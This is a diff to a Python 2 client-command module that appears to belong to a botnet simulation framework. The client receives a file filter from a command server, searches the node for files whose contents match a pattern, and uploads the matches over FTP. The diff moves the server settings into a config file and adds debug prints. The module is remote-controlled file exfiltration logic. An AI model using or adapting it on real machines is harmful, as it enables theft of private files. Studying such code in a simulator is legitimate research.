@@ -1,17 +1,9 @@
 #!/usr/bin/env python
 # ClientCommand
 import core
-
-client_desc = {
-        'initial' : 'disconn',
-        'start_action' : 'request_connect',
-        'srv_addr':'127.0.0.1',
-        # 'srv_addr':'10.0.0.0',
-        'srv_port':3333,
-        'request_timeout':10,
-        }
-
 import re
+from config import client_desc
+
 class ClientCMD(core.ClientCMD):
     # """this CMD requires nodes to provide a linux like command system"""
     def __init__(self, desc=client_desc):
@@ -27,16 +19,22 @@ class ClientCMD(core.ClientCMD):
         print 'set_file_filter'
         self.logger.debug('set_file_filter, receive data, %s'%(data))
         self.file_filter = data
+        print '------------------------------'
 
     def search_and_upload(self, sock, data):
         interesting_files = self._search_files(**self.file_filter)
+        if not interesting_files:
+            self.logger.info('no interesting files have been found')
+            return
         for f in interesting_files:
             self.upload_file(f)
 
-    def _search_files(self, pattern, suffix):
+    def _search_files(self, pattern, **kwargs):
         """search files in the machine with possible string pattern"""
-        file_list = self.node.get_file_list()
+        file_list = self.node.get_file_list(max_num=100, **kwargs)
+        print 'file_list', file_list
         interesting_files = [f for f in file_list if self._check_file(f, pattern)]
+        print 'interesting_files', interesting_files
         return interesting_files
 
     def _check_file(self, f, pattern):
@@ -45,11 +43,13 @@ class ClientCMD(core.ClientCMD):
         return True if re.search(pattern, f_content) else False
 
     def upload_file(self, f):
+        print 'self.ftp_info, ', self.ftp_info
         self.node.ftp_upload(f, **self.ftp_info)
 
 if __name__ == "__main__":
-    cmd = ClientCMD(client_fsm)
-    node = core.PhyNode()
+    cmd = ClientCMD(client_desc)
+    node = core.real.PhyNode()
     cmd.install(node)
-    node.start()
+    # node.start()
+    cmd._search_files()
     pass
